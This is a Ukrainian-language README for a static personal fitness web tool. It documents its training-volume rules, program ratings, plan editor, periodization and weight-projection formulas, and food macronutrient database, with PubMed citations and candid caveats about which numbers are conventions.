# Get Stronger

Особистий інструмент: підбір програми тренувань, розрахунок калорій і макронутрієнтів,
оцінка разового максимуму. Нічого не продає, реклами й підписок немає.

Чистий HTML/CSS/JS, без збірки й залежностей. Відкривається подвійним кліком по `index.html`.

Палітра: **один хроматичний колір `#15243B`, решта — чорне, біле й сірі відтінки.**
Логотип — словесний знак без іконки, шрифт **Archivo Black**.
Усі джерела — з PubMed.

## Швидкий старт

```bash
# Варіант 1: просто відкрити файл
open index.html

# Варіант 2: локальний сервер (потрібен, якщо хочеш перевірити роботу з Supabase)
python3 -m http.server 3000
# → http://localhost:3000
```

### Тести

```bash
npm test        # залежностей НЕМАЄ — вбудований runner Node
```

Тести покривають ядра логіки (`onerm-core.js`, `nutrition-core.js`,
`periodization-core.js`, `history-core.js`, `progress-core.js`,
`tracker-core.js`, `elo-core.js`, `day-core.js` та інші), шар даних
(`store.js`), правила service worker і цілісність довідників. `package.json` існує
**тільки** заради них і заради `tools/build-meta.js` — сайт як був
статичним, так і лишився, і далі відкривається подвійним кліком.

Кожен тест із позначкою `регресія:` стоїть на місці реальної помилки,
яку колись знайшли. Перед тим як «спростити» такий тест, подивись, що
саме він стереже.

### Перед викладенням

```bash
node tools/build-meta.js   # og:url у статичну розмітку (картка для месенджерів)
```

Потрібно тому, що краулери превʼю в месенджерах (Telegram, Slack, WhatsApp)
JavaScript **не виконують**: теги, які проставляє `js/app.js`, вони не бачать.
Скрипт запускається руками після того, як у `js/config.js` вписано `siteUrl`,
і він ідемпотентний — повторний запуск оновлює теги, а не додає другі.

## 1. Вправи, групи мʼязів і норми обʼєму

Файл `js/exercises.js` — довідник. Він живить дві речі: таблицю тижневого обʼєму
і випадайку заміни вправ у редакторі плану.

### Додати вправу

```js
{ name: 'Жим гантелей лежачи', muscles: ['chest'] }
```

`muscles` — масив id груп. Якщо у вправи дві рівноцінні цілі, вкажи обидві —
підходи зарахуються кожній:

```js
{ name: 'Румунська тяга', muscles: ['hamstrings', 'glutes'] }
```

**Правило зарахування:** підходи йдуть у *головну* робочу групу, а не в усі задіяні.
Жим лежачи — це груди, а не груди + трицепс + дельти. Інакше сумарний обʼєм
роздувається втричі й перестає щось означати.

Головна група — **перша в масиві `muscles`**. Порядок значущий:

```js
{ name: 'Румунська тяга', muscles: ['hamstrings', 'glutes'] }
```

Три підходи підуть біцепсу стегна. Сідниці згадані для того, щоб вправа
знаходилась у випадайці заміни й з їхнього боку, — але обʼєм вони не
отримують. Реалізація — `window.primaryMuscle` у кінці `js/exercises.js`.

> Довго тут було розходження: README і шапка `exercises.js` описували саме це
> правило, а код додавав підходи кожній групі. Через це смуга «Сідниці» на
> PPL/6 показувала 12/14 замість 6/14, а редактор на завищених числах ще й
> забороняв додати те, що в межу вкладалось. Тепер правило одне й воно в коді.

**Передпліччя розділені на три групи** — `brachiorad`, `wristFlex`, `wristExt`.
Це різні мʼязи з різними вправами: зворотний підйом працює на брахіорадіаліс,
згинання й розгинання запʼястя — на згиначі та розгиначі. Разом вони давали
24 підходи на тиждень і виглядали як грубе перевищення, хоча насправді
навантаження розкладене на три незалежні мішені.

### Норми обʼєму

```js
{ id: 'chest', name: 'Груди', size: 'large' }
```

`size` визначає стелю тижневого обʼєму: **велика група — 14** робочих підходів,
**мала — 12** (константа `VOLUME_CAP`). Є ще необовʼязкове поле `cap`, яке
перебиває це правило для окремої групи, але зараз воно не використовується —
усі групи живуть за загальним правилом.

**Це єдине число на групу.** «Оптимуму» більше немає: раніше поруч стояв ще й
цільовий орієнтир, смуга показувала два значення, і оптимум читався як норма,
якої треба досягти. Насправді існує лише стеля — менше нормально, більше не варто.

Стеля **не декоративна**: редактор плану не дає її перевищити. Поле підходів
отримує `max`, порахований від решти плану, а спроба додати вправу в заповнену
групу відхиляється з поясненням.

Перевіряються всі три шляхи, якими вправа потрапляє в план:

| Дія | Що перевіряється |
|---|---|
| Змінити підходи | `max` від решти плану по головній групі |
| Замінити вправу | стеля нової головної групи **і** дублікат у цьому ж дні |
| Додати вправу на групу | береться вправа, де ця група **головна** і якої ще немає в плані |

Раніше перевірку мала тільки перша дія. Заміна не перевіряла нічого — два кліки
на дефолтному плані давали і мовчазне перевищення, і ту саму вправу двічі в
одному дні. А «додати вправу на групу» брало просто `pool[0]`, і оскільки базові
схеми складені саме з перших елементів бібліотеки, дублікат виходив у 16
випадках із 16.

Це робочі орієнтири з практики, **не висновок конкретного дослідження**. Мета-регресія
показує, що приріст росте з обʼємом ([PMID 27433992](https://pubmed.ncbi.nlm.nih.gov/27433992/)),
але не називає точки, після якої він припиняється. Правити ці числа можна вільно.

## 2. Структура програм

Файл `js/programs-data.js` описує дні й вправи:

```js
{
  pattern: 'Горизонтальний жим',        // рухова модель (для програм-каркасів)
  name:    'Жим штанги лежачи',         // конкретна вправа
  muscles: ['chest'],                   // групи, на які йдуть підходи
  sets: 3, reps: '6', rir: '2', rest: '2–3 хв', note: ''
}
```

Поле `muscles` можна не вказувати — тоді групи візьмуться з `PATTERN_MUSCLES`
за назвою рухової моделі. Але для конкретних вправ краще задавати явно.

**Порожнє `name`** означає незаповнений слот: сайт покаже назву рухової моделі
й позначку, що вправу не задано. Нічого не ламається, зверху висить лічильник.

> дає значущої різниці в гіпертрофії (PMID 30558493). Ця думка не зникла
> разом із плашками — вона тепер стоїть над сіткою схем на самій сторінці
> «Плани тренувань» (коміт `9a3867d`), тобто в момент, коли людина обирає.

Рейтинг на сторінці «Програми»: S+ — UL/PPL, S — Full Body й UL, A — PPL.
Стоїть під планом, а не над списком схем: зверху він читався як вказівка
«бери оце» й перебивав собою фактичні характеристики, хоча це лише думка.

**Дані окремо від оцінки.** `TIERS` і `PROGRAM_TIER` живуть у кінці
`js/programs-data.js`, а не полем усередині програми. Причина принципова:
решта полів (частота, обʼєм, дні) описує те, що схема **робить**, а тир —
те, як я її **оцінюю**. В одному обʼєкті друге виглядало б такою самою
характеристикою, як перше.

**Рейтинг не має підтвердження й мати не може.** Мета-аналіз 25 робіт:
при однаковому тижневому обʼємі частота тренування групи мʼязів не дає
значущої різниці в гіпертрофії, а вибирати її радять за зручністю
([PMID 30558493](https://pubmed.ncbi.nlm.nih.gov/30558493/)). Тобто різниця
між цими схемами — питання розкладу, а не результату. На сторінці це
написано просто під рейтингом, поруч зі значком «моя думка, не дані».

**Кольору немає навмисно.** Класичний тир-лист кодує ранг червоним,
помаранчевим і жовтим. Правило палітри цього сайту — один хроматичний
колір плюс нейтральні, статуси розрізняються яскравістю. Тому вищий тир =
світліша плашка (`--g1` → `--g2` → `--g3`), як у смугах тижневого обʼєму.

**Плашки клікабельні.** Клік ставить кількість днів, за якої схема існує,
і відкриває її план. Рейтинг, на який не можна натиснути, лишався б просто
картинкою — а UL/PPL у S+ марний, якщо не видно, що він вимагає пʼяти днів.

Щоб перемістити схему — поміняй її значення в `PROGRAM_TIER`. Порядок
рядків задає порядок у `TIERS`. Тир на неіснуючу схему й схему без тиру
ловить `tiertest.js`.

## 4. Редактор плану

Кнопка «Редагувати» над планом вмикає правки прямо на сторінці:

| Дія | Як працює |
|---|---|
| Замінити вправу | Випадайка показує **тільки вправи на ту саму групу** з бібліотеки |
| Змінити вагу | Записується за назвою вправи й одразу зʼявляється в усіх днях і програмах |
| Змінити підходи | Поле поруч, обмежене 1–10 |
| Переставити | Стрілки вгору / вниз |
| Видалити | Підходи одразу зникають із тижневого обʼєму |
| Додати | Вибір групи внизу дня → підставляється перша вправа з бібліотеки |

Правки зберігаються автоматично в профіль під ключем `programId:days`
(наприклад `ppl:6`), тож різні варіанти по днях не перетираються.

### Дні плану згорнуті

Жоден день не розкривається сам. Раніше перший відкривався одразу, і сторінка
починалася довгою таблицею, крізь яку треба гортати до решти днів.
Виняток — режим правки: там ховати вміст безглуздо, редагувати можна тільки
те, що видно.

### Кнопка «Скопіювати план»

Кладе в буфер **два формати одразу**:

- `text/html` — таблиця з колонками № / Вправа / Підходи × повторення / Вага / RIR /
  Відпочинок. Нотатки, Word і Google Docs вставлять її саме таблицею;
- `text/plain` — той самий план рядками, для полів, які розмітку не приймають.

Оформлення таблиці — старими атрибутами (`border`, `cellpadding`), а не CSS:
редактори при вставці зазвичай викидають стилі, а атрибути таблиці розуміють.
Виглядає архаїчно, зате доїжджає.

Два правила формування:

- **Розминка й заминка не входять.** Вони спільні для всіх планів, і в шпаргалці
  біля стійки лише заважають.
- **Повторювані дні виводяться один раз.** Шестиденний PPL дає три блоки
  (Push, Pull, Legs), UL на чотири дні — два. Але порівнюються не назви,
  а `daySignature()` — заголовок плюс вміст: після правок два дні з однаковим
  заголовком можуть розʼїхатись, і тоді потрібні обидва.

Ваги підставляються з книги ваг, тож у тексті стоять твої числа, а не порожні місця.

Три рівні запасних шляхів, бо буфер обміну — найкапризніша частина браузера:

1. `navigator.clipboard.write()` з `ClipboardItem` — обидва формати. Потребує
   secure context, тобто на `file://` не працює;
2. прихований `contenteditable` + виділення + `execCommand('copy')` — так розмітка
   копіюється навіть без secure context;
3. простий `textarea` з текстом;
4. якщо не спрацювало нічого — текст показується на сторінці, щоб виділити вручну.

Тост розрізняє випадки: «скопійовано таблицею» проти «скопійовано текстом:
таблицю браузер не віддав».

### Робочі ваги живуть окремо від планів

Вага прив'язана до **назви вправи**, а не до її місця в плані:

```js
profile.weights = { 'Жим штанги лежачи': 90, 'Присідання зі штангою': 120 }
```

Жим лежачи важить однаково і в понеділок, і в четвер, і в іншій програмі.
Тримати для цього три окремі поля означало б вписувати те саме число щоразу
й ловити розбіжності руками. Тому в `customPlans` вага **не зберігається
взагалі** — план описує вправи, підходи й повторення, а вага лежить у книзі.
Одне джерело правди замість трьох копій.

Назовні план віддається вже «зібраним»: `PlanEngine.current()` підставляє ваги
з книги в `ex.weight`, тому прогноз і решта коду про книгу не знають.

Після правки поля решта полів тієї самої вправи оновлюється **без
перемальовування плану** — інакше згорнулись би відкриті дні й стрибнув скрол.
Поле, у якому зараз друкують, не чіпається, щоб курсор не стрибав.

**Міграція.** До цієї версії вага лежала всередині плану. При першому
завантаженні `harvestWeights()` переносить старі числа в книгу; якщо та сама
вправа мала різні ваги в різних днях, лишається більша — саме вона є робочою межею.

**Компроміс:** зберігається весь план цілком, а не набір відмінностей від базового.
Якщо базова програма в `programs-data.js` колись зміниться, збережений план цього
не підхопить. Натомість поведінка передбачувана, і завжди є кнопка «Скинути».

## 5. Мій план і прогноз

`programs.html` → кнопка **«Обрати цей план»** записує в профіль `activePlan = {programId, days}`
і перекидає на `plan.html`. Обидві сторінки обслуговує один і той самий `js/programs.js`:
режим визначається наявністю `#program-list` (сторінка програм) або `#my-plan` (мій план).
Дублювання редактора немає — це той самий код.

Зв'язок між планом і прогнозом — через подію `plan:change` на `document`, а не прямий виклик.
Так `programs.js` не залежить від наявності `projection.js`: на `programs.html` його просто немає.
Поточний стан читається через `window.PlanEngine.current()`.

### Модель прогнозу — прочитай, перш ніж вірити числам

**Це не прогноз. Це арифметика на припущеннях.** Дослідження, яке дозволяло б передбачити
ріст робочої ваги конкретної людини на рік уперед, не існує. На всій решті сайту кожна
цифра має PMID — **у цієї сторінки PMID немає й бути не може**, і вона про це прямо каже.

Формула:

```
w(t) = w0 × (1 + g × T × ln(1 + t/T))
```

| Що | Значення | Звідки |
|---|---|---|
| Форма кривої | логарифм | обґрунтована: приріст сповільнюється, але не зупиняється |
| `T` | 12 місяців | **конвенція** |
| `g` — до 1 року | 3,0 %/міс | **конвенція** |
| `g` — 1–3 роки | 1,5 %/міс | **конвенція** |
| `g` — 3–5 років | 0,8 %/міс | **конвенція** |
| `g` — понад 5 років | 0,4 %/міс | **конвенція** |
| Сценарії | ×0,6 / ×1,0 / ×1,5 | чутливість до припущення, **не ймовірність** |

Чому саме логарифм, а не пряма чи насичена експонента:

- **Пряма** («+2,5 кг кожні 3 тижні») дає жим 60 → 103 кг за рік і 277 кг за пʼять.
  Друге — за межами світових рекордів. Сайт малює цю пряму поруч навмисно, щоб було видно.
- **Насичена експонента** має жорстку стелю з нульовим приростом після неї. Теж неправда:
  люди прогресують десятиліттями, просто дедалі повільніше.

**Крок округлення залежить від ваги**, а не єдиний для всіх вправ: від 20 кг —
2,5 кг (млинці), нижче — 1 кг. Це те саме правило, що в `periodization-core.js`
(`stepFor`), і воно тут не декоративне: доти, доки прогноз округляв усе до 2,5 кг,
рядок «махи 8 кг за пів року» друкувався як **«7,5 +−0,5»** — прогноз росту
показував падіння й ще й із подвійним знаком. Прогноз тепер ніколи не показує
результат, менший за поточну вагу.

Правити коефіцієнти — у `TIERS` на початку `js/projection.js`. Вони там для того,
щоб їх правити під власну історію.

Модель не враховує: травми, перерви, сон, стрес, дефіцит калорій, зміну власної ваги,
зміну техніки, стелю конкретної вправи, вік, генетику.

## 6. Скидання ваг і періодизація

Дві окремі речі, які часто плутають. **Скидання** — разова дія: опустити все
й далі йти як зазвичай. **Періодизація** — розписаний наперед цикл на 8–16
тижнів із заданим маршрутом від легкого до важкого.

### Крок робочої ваги

Чотири кнопки на «Моєму плані»: **−2,5**, **+2,5**, **−5** і **+5 кг на ноги**.
Закрив діапазон повторень — піднімаєш, не перебираючи двадцять полів руками.

**Ноги мають окремий крок, і це не примха.** Присід і жим ногами тягнуть
+5 кг там, де жим лежачи тягне +2,5: мʼязова маса більша, відносний приріст
від тих самих 2,5 кг менший. Практична конвенція силових програм, не висновок
дослідження. Тому кнопка «+2,5» за замовчуванням ноги **не чіпає** — для них
є своя.

Галочка **«і на ноги теж»** вмикає ноги в загальний крок, коли пʼятірка
завелика. Знята за замовчуванням і **не зберігається в профіль**: дія разова,
а «залипла» з минулого тижня галочка мовчки поміняла б ваги не там, де
очікуєш.

Ногами вважаються квадрицепс, біцепс стегна, сідниці, привідні, відвідні
й литки (`LEG_MUSCLES` у `js/programs.js`) — 21 вправа з 64. Вправа, якої
немає в бібліотеці (лишилась у книзі зі старого плану), вважається верхом:
промах у цей бік означає лише, що вона не отримає +5, і це видно одразу.

`+` і `−` точно обернені одне одному, тому знімка тут не треба — на відміну
від скидання нижче, де округлення робить зворотний хід неможливим.

### Скидання ваг (кнопка на «Моєму плані»)

> **Коли знімок «до скидання» перестає бути чинним.** Його зʼїдають кнопки ±кг,
> «+10%» **і ручне редагування ваги в полі**. Останнє довго було пропущене, і це
> давало найтихішу з можливих втрат: скинув −10% (80 → 72,5), за три тижні
> відпрацював назад до 85 руками, натиснув «Повернути як було» — і отримав 80.
> Зароблені 5 кг зникали, а кнопка при цьому обіцяла «точні числа, які були до цього».
>
> І друге: повернення тепер **зливає** знімок із поточною книгою, а не замінює її
> цілком. Вправа, додана вже після скидання, у знімку не значиться — раніше вона
> при поверненні втрачала вагу повністю й випадала з таблиці періодизації.

Множить усю книгу ваг на один коефіцієнт, від −5% до −50% кроком 5. Одна дія
на всі вправи: після двох тижнів без залу просідає все одразу, а не окремо жим.

Дві деталі, які легко зробити неправильно:

**Округлення тільки вниз.** При звичайному округленні до найближчого кроку
12 кг мінус 5% дає 11,4 → 12,5 — тобто «скидання» піднімало б вагу. Це не
теоретична вигадка, саме на цьому впав перший варіант і його зловив тест.
Тепер `Math.floor` до кроку: гірше на пів кроку, ніж просили, зате ніколи не
вгору. Для деслоуду помилка в бік легшого безпечна за визначенням.

**Крок залежить від самої ваги.** Книга ваг не знає, штанга це чи гантель,
тому розділяємо за числом: від 20 кг — крок 2,5 кг (пара млинців по 1,25),
нижче — 1 кг. Інакше на махах з 10 кг крок був би чвертю ваги.

Повернення працює через **знімок**, а не зворотне множення: після округлення
поділити назад не виходить, а після двох скидань поспіль розбіжність уже
помітна. Знімок береться один раз — друге скидання не затирає вихідні числа
вже зменшеними.

Скільки знімати — питання без точної відповіді, і на сторінці так і написано.
Груба прикидка з практики: тиждень — нічого, 2–3 тижні — 5–10%, місяць —
10–20%, від двох місяців — 20–30%. Це не висновок дослідження.

### Періодизація (окрема сторінка)

Лінійний цикл: старт від відсотка разового максимуму, щотижня або кожні два
тижні вага росте, за 8–16 тижнів виходиш на важке.

**Два режими керування, і це не примха.** Зафіксувати одночасно старт, фініш,
кількість тижнів і крок не можна — система стає перевизначеною, і якесь із
чисел довелося б мовчки зламати. Тому перемикач: або задаєш кінцевий % і крок
рахується, або задаєш крок і рахується кінцевий %. Друге число завжди
показано поруч як похідне.

**Повторення виводяться з відсотка, а не беруться з плану.** Відсоток від 1ПМ
і кількість повторень — це одне й те саме число, сказане двома способами. Не
можна одночасно поставити 90% і «6–8 разів»: такої ваги на вісім разів не
існує. Тому на тижнях циклу головним стає відсоток: 70% ≈ 12 повторень,
80% ≈ 8, 85% ≈ 6, 95% ≈ 2. Обернення робиться двійковим пошуком по
`percentOfMax` — аналітично середнє Epley і Brzycki в один рядок не
обертається.

**Стеля 12 повторень (`REP_CAP`) і запас.** Формула на 50% дає близько 22
повторень до відмови. Математично правильно, як припис безглуздо: підхід на
двадцять разів тренує витривалість, а не силу, і до задачі перших тижнів
(зайти легко, відновити рух, поставити техніку) стосунку не має.

Тому число обрізається на 12, а різниця виводиться окремим полем `reserve`:
на 50% у таблиці стоїть «12, запас 10» — зроби дванадцять і зупинись, маючи
ще десяток у баку. Легкі тижні свідомо далеко від відмови, і це не побічний
ефект, а їх сенс.

**Старт не нижче 50%** (`LIMITS.startPct = [50, 70]`). Нижче — це вже розминка,
а не робочий підхід, і цикл із такого старту просто витрачає перші тижні.

**Окрема стеля для ізоляції — 75% замість 95%.** 90% від 1ПМ у махах з
гантелями це не важкий підхід, це плече. Односуглобові вправи з довгим
важелем не тестуються на максимум і не тренуються біля нього. Для цього в
`js/exercises.js` у кожної вправи є поле `lift`: `'compound'` або
`'isolation'`. Якщо поле не вказане, вправа вважається ізоляцією — промах у
цей бік безпечніший.

**1ПМ заморожується при запуску циклу.** Інакше зміна робочої ваги в плані
або скидання ваг посеред циклу зсували б усю таблицю заднім числом. Кнопка
«Перерахувати 1ПМ» оновлює оцінки навмисно.

Джерело 1ПМ: спершу виміряний рекорд з «Акаунта» (присідання, жим лежачи,
армійський жим), інакше оцінка з робочої ваги. Оцінка рахується не з самої
кількості повторень, а з повторень **до відмови**: 6–8 при RIR 2 → 9. Без
цієї поправки 1ПМ систематично занижувався б.

### Що кажуть дані, і де вони проти цієї сторінки

Що періодизація загалом працює — підтверджено: мета-аналіз 18 робіт показав
більший приріст 1ПМ проти непериодизованого тренування, ES 0,43
([PMID 28497285](https://pubmed.ncbi.nlm.nih.gov/28497285/)).

Але дані працюють **проти саме лінійної схеми**, яку рахує ця сторінка. У
мета-аналізі з вирівняним обʼємом хвилеподібна періодизація дала більший
приріст 1ПМ, ніж лінійна — щоправда, тільки в тренованих; у новачків різниці
немає, а на гіпертрофію обидві вплинули однаково
([PMID 35044672](https://pubmed.ncbi.nlm.nih.gov/35044672/)).

Тобто лінійний цикл тут доречний як **повернення в роботу** після перерви —
задача, для якої він і задуманий. Як постійна схема для тренованого це не
найкращий вибір, і сторінка каже про це прямо. Конкретних відсотків по тижнях
жодне дослідження не називає: числа в моделі — конвенція силових програм.

## 7. Продукти, рецепти й раціон

### Сире, сухе й готове — головне в цьому файлі

У 100 г **готового** курячого філе білка більше, ніж у 100 г сирого. Це не помилка
довідників: мʼясо втрачає воду, білок нікуди не дівається й концентрується в меншій масі.
Крупи й макарони поводяться дзеркально — воду набирають.

Тому кожен продукт у `js/foods.js` має два поля:

```js
{ state: 'raw',   // 'raw' сире | 'dry' сухе | 'ready' готове до вживання
  yield: 0.73 }   // маса після приготування / маса до нього
```

Перерахунок: `на 100 г готового = per100 / yield`.

Перевірка, що модель не вигадана — вона відтворює довідкові значення:

| Продукт | Сире / сухе | Готове (розрахунок) | Довідник |
|---|---|---|---|
| Куряче філе | 120 ккал, 22,5 г білка | **164 ккал, 30,8 г** | USDA 05064: 165 ккал, 31 г |
| Рис басматі | 350 ккал | **121 ккал** | варений ~120 ккал |
| Barilla класична | 359 ккал | **156 ккал** | варені ~155 ккал |

Практично: **зважуй завжди в одному стані, і краще в сирому чи сухому.** Вихід залежить
від того, скільки й на чому ти готував; суха вага не залежить ні від чого.

### Вуглеводи рахуються без клітковини

`c` — вуглеводи БЕЗ клітковини, `fiber` окремо (європейське маркування, як на пачці Barilla).
Значення з USDA, де клітковина входить у вуглеводи, тут перераховані. Якщо цього не робити,
калорійність овочів і горіхів завищується на 20–25%, бо клітковина дає ~2 ккал/г, а не 4.

Контроль: `kcal ≈ p×4 + f×9 + c×4 + fiber×2` — **із допуском 20%, а не як точна рівність**.

Для мʼяса, круп, молочного й солодощів формула сходиться в межах кількох відсотків.
Для овочів, ягід і грибів — ні, і це не помилка даних: USDA застосовує до них
специфічні коефіцієнти Атвотера замість загальних 4/9/4. Гриби дають розходження
+19,5%, гарбуз +15%, огірок +14%, малина −12% — усі ці позиції звірені з USDA
й правильні. Тому тест (`tests/data.test.js`) стереже саме допуск 20%: він ловить
грубу помилку в числі й не бʼє тривогу на кожен огірок.

**Цільові вуглеводи теж нетто.** Ядро віднімає енергію клітковини (2 ккал/г) перед
тим, як ділити залишок на 4. Доти, доки цього не було, клітковина оплачувалась
двічі — по 4 ккал/г усередині вуглеводів і ще раз по 2 окремою смугою; хто закривав
усі пʼять смуг рівно на 100%, зʼїдав на 2,8% більше за ціль, і смуга «Калорії»
показувала перебір, поки решта показувала «точно».

### Barilla

Усі **класичні** номери мають однакові КБЖВ — це те саме тісто із семоліни твердої пшениці.
Номер змінює форму й час варіння, не склад. Тому в базі один запис на всю лінійку,
а не 17 однакових рядків.

Таблиця відповідності «номер → форма» (`BARILLA_SHAPES` у `js/foods.js` і
акордеон «Номери макаронів» у раціоні) прибрана: до розрахунку КБЖВ вона
стосунку не мала — це був довідник форм макаронів на сторінці обліку їжі.

Лінійки з **іншими** значеннями: Integrale (є в базі), Senza Glutine, Protein+, Legumi,
Emiliane. Для них треба дивитись пачку.

### Вбудовані рецепти

`js/recipes-data.js` — рецепти, що приходять із сайтом. Показуються поряд
із власними, але лише для читання: кнопки «Змінити» немає, натомість є
«Зробити копію» — копія лягає у власні з новим id і далі правиться вільно.

Чому окремо від власних: власні лежать у профілі й належать користувачу,
вбудовані — у коді й оновлюються разом із сайтом. Якби вони жили в одному
місці, оновлення або мовчки перезаписувало б чиїсь правки, або виправлена
помилка ніколи не доїхала б до того, хто рецепт уже відкривав.

Правило одне: тільки реальні рецепти з посиланням на джерело. Рецепт без
автора неможливо перевірити, а вигадані з сайту вже прибирали.

**Два списки інгредієнтів, і це навмисно.** `parts` — рецепт як його читають:
усе, включно зі спеціями, сіллю та олією-спреєм, поділене на страви. `items` —
те, що йде в арифметику: лише продукти, які є в `js/foods.js`. Спершу був
тільки `items`, і вийшла не картка рецепта, а таблиця КБЖВ: ні спецій, ні
поділу на страви, ні способу приготування. Готувати за таким «рецептом»
неможливо. Розходження між списками нормальне — спеції дають одиниці калорій,
заводити заради них записи в базу немає сенсу, але зникати з рецепта вони не
повинні.

**Способу приготування в даних немає навмисно.** Метод — у відео за
посиланням. Переказувати чужі кроки своїми словами означає взяти на себе
відповідальність за температури й час, яких я не перевіряв, тому в картці
лишився тільки склад, а в примітці — вказівка дивитись відео.

**Склад показується акордеоном** — тим самим `.acc`, що блок «Виробництво»
на сторінці добавок: одна згорнута смуга внизу картки. Розгорнутим список із
18 рядків відсував би сусідні рецепти на екран униз, а картка має лишатись
оглядовою.

Тонке місце: `initAccordions()` викликається **всередині** `renderRecipes()`,
а не один раз у `renderAll()`. Рецепти перемальовуються ще й після збереження,
копіювання, розкриття складу й перемикання згортання — після кожного з них
у контейнері лежить новий DOM, і акордеони в ньому просто не розкривалися б.
Мовчки, без помилки. Це той самий клас пастки, що й `reveal` у динамічній
розмітці, тому в тестах є окрема перевірка.

**Перший рецепт** — курка з аерогриля з мак-н-чізом на 5 контейнерів
([відео](https://www.youtube.com/watch?v=GF6vms6wSmY)). Заради нього в базу
додано вісім продуктів: панко, чеддер, моцарела, плавлений сир, діжонська
гірчиця, паста з червоної сочевиці, знежирене молоко, соус чилі. Дані —
етикетки з Open Food Facts, кожна звірена перевіркою
`ккал ≈ Б×4 + Ж×9 + В×4 + клітковина×2`, найбільше відхилення 4,8%.

**Кількість порцій береться з джерела, а не виводиться.** Спершу я поставив 6,
бо при шести білок сходився з заявленими 70 г. Це виявився збіг: сторінка
автора каже 5 порцій по 500 г. Виводити структуру рецепта з макросів —
поганий метод, і цей випадок показав чому.

Розбіжність із автором лишається. Він пише 736 ккал на порцію, за базою
виходить 832. Причини дві. Перша — помилка в самому підписі автора: його ж
макроси (15 Ж / 65 В / 70 Б) дають 675 ккал, а не 736. Друга — в базі
звичайні моцарела й плавлений сир, а в рецепті полегшені, і паста з червоної
сочевиці білковіша за середню. Вуглеводи при цьому сходяться майже точно
(66 проти 65) — вони найменше залежать від жирності сиру, тому саме вони й
підтверджують, що склад зчитано правильно. Спеції та олія-спрей у розрахунок
не входять — близько 12 ккал на порцію, і про це сказано в картці.

### Рецепти

Готових рецептів на сайті **немає навмисно** — тільки конструктор. Дивишся відео,
тиснеш «Створити рецепт», забиваєш свої грами й лишаєш URL першоджерела в полі
посилання.

Маси інгредієнтів зберігаються в базовому стані продукту (мʼясо сире, крупа суха),
а `containers` ділить підсумок на порції.

### Довідник продуктів згорнутий за замовчуванням

Продуктів майже сотня. Розгорнутим довідник займав більшу частину сторінки,
і до рецептів із денним підсумком доводилось гортати крізь усю таблицю.
Тепер він відкривається полоскою із заголовком і підказкою, що всередині.

Це саме замовчування, а не примус: щойно блок розгорнули руками, вибір
лягає в `localStorage` (`ib.meals.fold`) і надалі сторінка відкривається так,
як залишили.

Плюс сама таблиця тепер має стелю висоти (`.table-wrap--tall`, 460px) і
скролиться всередині себе з липкою шапкою. Навіть розгорнутий довідник більше
не розсуває сторінку на кілька екранів.

### Згортання блоків

Таблиця продуктів — майже сотня рядків, і вона відсувала день із підсумками
далеко вниз. Тому «Продукти» і «Рецепти» згортаються кнопкою в заголовку,
а вибір запамʼятовується.

Стан лежить у `localStorage` під ключем `ib.meals.fold`, а **не** в профілі:
це налаштування показу, а не дані користувача, і синхронізувати його між
пристроями сенсу немає.

У згорнутому вигляді замість блоку показано, що всередині («92 продукти
у базі», «3 рецепти») — інакше згорнутий заголовок нічого не каже.

### Вікно додавання в день

Кнопки «У день» (продукт) і «Додати в день…» (рецепт) відкривають одне вікно,
де ухвалюються всі три рішення одразу:

| Що обирається | Навіщо |
|---|---|
| Сире / сухе / готове | від цього залежать усі числа; для продуктів із `yield: 1` вибір не показується |
| Маса або кількість контейнерів | з кнопками швидкого вводу й побутовою мірою, якщо вона є в `unit` |
| Прийом їжі | зі списку наявних або «+ новий прийом» |

КБЖВ рахується просто у вікні, до додавання. Поруч із масою видно перерахунок
у протилежний стан: вбив 200 г сирого — бачиш «після готування вийде ~146 г».

`Enter` додає, `Escape` закриває. Стан вікна живе в `state.modal` і ніде не
зберігається: це чернетка, а не дані.

### Брендові продукти

Напої та солодке (Coca-Cola, Red Bull, Monster, Fuze Tea, Milka, Snickers) взяті
з етикеток через Open Food Facts. Рецептури різняться між країнами — це орієнтир,
а не паспорт конкретної банки.

Кофеїн винесений у поле `note`, бо в калоріях його не видно: банка Monster 500 мл —
це ~160 мг, майже разова межа EFSA (200 мг).

**Один запис відхилено.** Публічна картка Twix давала 496 ккал при макронутрієнтах
на 710 ккал — тобто внутрішньо суперечлива. Перевірка `kcal ≈ p×4 + f×9 + c×4 + fiber×2`
ловить саме такі випадки, тому продукт до бази не потрапив.

### Джерела складу продуктів

Склад продуктів беруть
із таблиць складу (USDA FoodData Central) і етикеток виробника, а не з клінічних досліджень.
Етикетка в ЄС має законний допуск до ±20% для білків і вуглеводів, тож систематична
похибка 10% тут нормальна.

## 8. Прогноз маси на сторінці харчування

Дві різні за надійністю речі поруч — і навмисно різними словами.

### Вага — арифметика

```
для кожного місяця:
    витрати  = TDEE(поточна вага)          ← перераховуються щомісяця
    адаптація = −10% на дефіциті, вводиться за перші 3 місяці
    Δкг      = (ціль − витрати × адаптація) × 30,4 / 7700
```

7700 ккал/кг — енергоємність жирової тканини.

**Чому помісячно, а не одним множенням.** Спершу тут стояло
`Δ = (ціль − витрати) × 365 / 7700`: дефіцит рахувався один раз від початкового
TDEE й множився на рік. Вага в моделі мінялась, витрати — ні. Для цілком
звичайного профілю (чоловік 80 кг, 180 см, 30 років, активність 1,55, агресивне
схуднення) це давало **−32,7 кг за рік і кінцеву вагу 47,3 кг**, тобто ІМТ 14,6.
У межах, які дозволяє сама форма, знаходилось 12 профілів із прогнозом ≤ 0 кг.

Три запобіжники, які цього більше не дають:

1. **TDEE перераховується щомісяця** від поточної ваги — крива сама виходить на плато.
2. **Метаболічна адаптація −10%** понад те, що дає втрата ваги: менше спонтанного
   руху, дешевша робота меншого тіла, нижчий тонус щитоподібної.
3. **Режим має кінець.** `cutfast` сам заявляє «макс. 8–12 тижнів» — тепер модель
   це й рахує: після 3 місяців вона переходить на підтримання. Прогноз мусить
   рахувати те, що сам і радить.

Плюс межа знизу: нижче ІМТ 18,5 модель не спускається, а якщо стартова вага вже
нижча за норму — дефіцит не прогнозується взагалі (`belowNorm`). Слабка ланка
лишається одна: оцінка витрат, яка помиляється на ±10–15%.

Є ще системний зсув, і він у моделі описаний: 7700 — це про **жир**. Суха
тканина «коштує» дешевше, а глікоген приходить із водою. Тому в перші один-два
тижні набору вага росте швидше за модель, і це не мʼязи. На дефіциті дзеркально.

### Мʼязи — модель зі стелею

Ключова ідея: приріст сухої маси має **стелю швидкості**, і калорії її не
піднімають. Зайве йде в жир.

| Стаж | Стеля, кг сухої маси / міс |
|---|---|
| до 1 року | 0,90 |
| 1–3 роки | 0,45 |
| 3–5 років | 0,22 |
| понад 5 років | 0,11 |

